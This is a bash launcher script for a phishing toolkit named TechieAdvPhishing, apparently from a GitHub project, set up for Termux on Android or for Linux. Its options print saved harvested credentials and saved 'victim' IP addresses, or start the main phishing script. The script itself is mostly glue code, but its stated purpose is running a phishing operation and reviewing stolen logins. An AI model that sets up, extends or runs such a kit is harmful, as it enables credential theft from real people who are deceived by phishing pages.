#!/bin/bash

# https://github.com/TechieGamer1/TechieAdvPhishing

if [[ $(uname -o) == *'Android'* ]];then
	TechieAdvPhishing_ROOT="/data/data/com.termux/files/usr/opt/TechieAdvPhishing"
else
	export TechieAdvPhishing_ROOT="/opt/TechieAdvPhishing"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run TechieAdvPhishing type \`TechieAdvPhishing\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $TechieAdvPhishing_ROOT/auth/usernames.dat 2> /dev/null || { 
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $TechieAdvPhishing_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $TechieAdvPhishing_ROOT
	bash ./TechieAdvPhishing.sh
fi
